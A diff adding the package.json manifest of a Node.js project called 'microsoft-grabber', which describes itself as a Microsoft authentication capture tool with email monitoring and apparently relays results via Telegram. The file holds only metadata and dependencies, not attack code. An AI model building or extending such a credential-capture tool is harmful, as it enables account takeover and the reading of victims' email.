@@ -1,0 +1,31 @@
+{
+  "name": "microsoft-grabber",
+  "version": "2.0.0",
+  "description": "Enhanced Microsoft authentication capture tool with email monitoring",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "dev": "nodemon server.js",
+    "monitor": "node email-monitor.js"
+  },
+  "dependencies": {
+    "@azure/msal-node": "^2.16.3",
+    "dotenv": "^16.6.1",
+    "express": "^4.21.2",
+    "express-rate-limit": "^7.5.1",
+    "express-session": "^1.18.2",
+    "form-data": "^4.0.4",
+    "node-fetch": "^2.7.0"
+  },
+  "devDependencies": {
+    "nodemon": "^3.1.10"
+  },
+  "keywords": [
+    "microsoft",
+    "oauth",
+    "monitoring",
+    "telegram"
+  ],
+  "author": "",
+  "license": "ISC"
+}
